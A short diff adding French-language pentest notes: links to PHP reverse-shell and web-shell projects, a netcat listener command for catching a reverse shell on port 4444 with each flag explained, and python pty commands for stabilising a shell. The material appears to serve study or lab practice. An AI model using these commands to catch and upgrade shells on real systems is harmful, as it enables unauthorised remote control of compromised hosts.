@@ -204,6 +204,12 @@
     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
     https://github.com/flozz/p0wny-shell
 
+    nc -lnvp 4444
+      -l pour démarrer l’écoute des connexions TCP
+      -n pour empêcher les résolutions DNS sur l’ip d’écoute
+      -v pour obtenir des résultats détaillés
+      -p pour lui indiquer le port d’écoute renseigné dans mon reverse shell (4444)
+
     stabiliser shell python :
       python -c 'import pty;pty.spawn("/bin/bash");'
       python -c 'import pty; pty.spawn("/bin/bash")'
